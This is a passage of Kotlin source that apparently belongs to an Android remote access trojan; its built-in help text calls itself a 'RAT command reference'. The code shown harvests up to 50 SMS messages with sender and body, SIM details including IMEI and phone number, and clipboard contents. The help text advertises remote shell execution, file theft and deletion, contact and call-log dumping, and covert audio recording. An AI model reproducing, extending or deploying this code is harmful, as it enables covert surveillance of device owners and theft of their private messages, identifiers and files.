            val smsType = when (type.lowercase()) {
                "sent" -> "sent"
                "inbox", "" -> "inbox"
                else -> "inbox"
            }

            val uri = Uri.parse("content://sms/$smsType")
            val cursor = context.contentResolver.query(uri, null, null, null, "date DESC")

            val result = StringBuilder()
            result.appendLine("=== SMS $smsType ===")
            result.appendLine()

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val number = c.getString(c.getColumnIndexOrThrow("address")) ?: "Unknown"
                        val date = c.getLong(c.getColumnIndexOrThrow("date"))
                        val body = c.getString(c.getColumnIndexOrThrow("body")) ?: ""
                        val person = c.getString(c.getColumnIndexOrThrow("person"))

                        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        val formattedDate = dateFormat.format(Date(date))

                        result.appendLine("#$count")
                        result.appendLine("Number: $number")
                        result.appendLine("Person: $person")
                        result.appendLine("Date: $formattedDate")
                        result.appendLine("Body: $body")
                        result.appendLine()

                        count++
                        if (count >= 50) {
                            result.appendLine("... (showing first 50 messages)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.appendLine("No SMS messages found")
                }
            }
            result.toString()
        } catch (e: Exception) {
            "Error reading SMS: ${e.message}\n"
        }
    }

    private fun getSimDetails(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_PHONE_STATE required\n"
            }

            val result = StringBuilder()
            result.append("=== SIM DETAILS ===\n\n")

            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            result.append("Network Operator: ${telephonyManager.networkOperatorName ?: "Unknown"}\n")
            result.append("Network Country: ${telephonyManager.networkCountryIso ?: "Unknown"}\n")
            result.append("SIM Country: ${telephonyManager.simCountryIso ?: "Unknown"}\n")
            result.append("SIM Operator: ${telephonyManager.simOperatorName ?: "Unknown"}\n")
            result.append("SIM State: ${telephonyManager.simState}\n")
            result.append("Phone Type: ${telephonyManager.phoneType}\n")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                result.append("Network Type: ${telephonyManager.dataNetworkType}\n")
            } else {
                @Suppress("DEPRECATION")
                result.append("Network Type: ${telephonyManager.networkType}\n")
            }

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    result.append("IMEI: ${telephonyManager.imei ?: "Not available"}\n")
                } else {
                    @Suppress("DEPRECATION")
                    result.append("Device ID: ${telephonyManager.deviceId ?: "Not available"}\n")
                }
            } catch (e: Exception) {
                result.append("Device ID: Not accessible\n")
            }

            try {
                result.append("Phone Number: ${telephonyManager.line1Number ?: "Not available"}\n")
            } catch (e: Exception) {
                result.append("Phone Number: Not accessible\n")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    val subscriptionManager = SubscriptionManager.from(context)
                    val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList

                    if (activeSubscriptions?.isNotEmpty() == true) {
                        result.append("\nSIM Cards:\n")
                        activeSubscriptions.forEachIndexed { index, subInfo ->
                            result.append("  SIM ${index + 1}:\n")
                            result.append("    Display Name: ${subInfo.displayName}\n")
                            result.append("    Carrier: ${subInfo.carrierName}\n")
                            result.append("    Number: ${subInfo.number ?: "Unknown"}\n")
                            result.append("    Country: ${subInfo.countryIso}\n")
                            result.append("    Slot: ${subInfo.simSlotIndex}\n")
                        }
                    } else {
                        result.append("\nNo active SIM cards found\n")
                    }
                } catch (e: Exception) {
                    result.append("\nSIM enumeration error: ${e.message}\n")
                }
            }

            return result.toString()

        } catch (e: Exception) {
            "SIM details error: ${e.message}\n"
        }
    }

    private fun getClipboardData(): String {
        return try {
            val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboardManager.hasPrimaryClip()) {
                val clipData = clipboardManager.primaryClip
                val clipText = clipData?.getItemAt(0)?.text?.toString()
                clipText ?: "Empty"
            } else {
                "Empty"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun getCompleteHelpText(): String {
        return """
=== COMPLETE RAT COMMAND REFERENCE ===

DEVICE INFORMATION:
  deviceInfo                 --> Complete device information
  getIP                      --> Device IP address
  getMACAddress              --> MAC address information
  getSimDetails              --> SIM card details
  sysinfo                    --> System information (memory, storage, CPU)

FILE OPERATIONS:
  pwd                        --> Show current directory
  cd <path>                  --> Change directory
  ls [path]                  --> List directory contents
  download <file>            --> Download file (base64 encoded)
  upload <name> <data>       --> Upload file from base64 data
  delete <file>              --> Delete file
  mkdir <path>               --> Create directory

SYSTEM OPERATIONS:
  ps                         --> List running processes
  kill <process>             --> Kill process by name
  shell <command>            --> Execute shell command
  netstat                    --> Network connections
  ping <host>                --> Ping host

DATA ACCESS:
  getSMS [inbox|sent]        --> SMS messages
  getCallLogs                --> Call history
  getContacts                --> Contact list
  getApps                    --> Installed applications
  getPhotos                  --> Photo information
  getAudio                   --> Audio files information
  getVideos                  --> Video files information

CLIPBOARD:
  getClipData                --> Get clipboard content
  setClip <text>             --> Set clipboard content

AUDIO RECORDING:
  startAudio                 --> Start audio recording
  stopAudio                  --> Stop and download audio

DEVICE CONTROL:
  vibrate [times]            --> Vibrate device

SYSTEM:
  help                       --> Show this help
  clear                      --> Clear screen
  exit                       --> Close connection

USAGE EXAMPLES:
  ls /sdcard/Download        --> List download folder
  download /sdcard/photo.jpg --> Download a photo
  shell cat /proc/version    --> Get kernel version
  ping google.com            --> Test internet connectivity
  kill com.android.browser   --> Kill browser process

        """.trimIndent() + "\n"
    }
}